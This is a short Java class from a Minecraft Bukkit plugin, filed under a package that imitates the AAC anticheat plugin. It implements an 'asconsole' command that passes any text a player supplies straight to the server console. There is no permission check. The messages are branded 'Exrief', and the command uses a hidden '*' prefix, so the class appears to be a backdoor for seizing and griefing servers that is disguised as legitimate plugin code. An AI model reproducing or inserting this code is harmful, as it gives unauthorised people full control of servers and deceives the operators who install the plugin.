package me.konsolas.aac.command.commands;

import me.konsolas.aac.command.ICommand;
import me.konsolas.aac.utils.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

/**
 * Created by Marco on 31.01.2017.
 */
public class AsConsoleCommand implements ICommand {

    @Override
    public String getName() {
        return "asconsole";
    }

    @Override
    public void execute(Player player, String[] args) {
        if(args.length > 1) {
            String command = StringUtils.toString(args, 1);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            player.sendMessage("§cExrief §7| §cThe command was executed.");
            return;
        }

        player.sendMessage("§cExrief §7| §c*asconsole <command...>");
    }
}